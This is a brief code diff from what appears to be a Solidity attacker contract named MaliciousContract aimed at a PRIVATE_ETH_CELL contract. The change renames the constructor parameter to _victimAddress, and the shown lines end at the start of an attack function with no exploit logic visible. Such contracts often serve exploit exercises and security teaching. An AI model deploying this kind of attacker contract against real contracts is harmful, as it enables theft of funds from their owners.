@@ -7,8 +7,8 @@ contract MaliciousContract {
     PRIVATE_ETH_CELL privateETHCell;
     bool attackInitiated;
 
-    constructor(address _privateETHCell) public {
-        privateETHCell = PRIVATE_ETH_CELL(_privateETHCell);
+    constructor(address _victimAddress) public {
+        privateETHCell = PRIVATE_ETH_CELL(_victimAddress);
     }
 
     function attack(uint amount) public  {
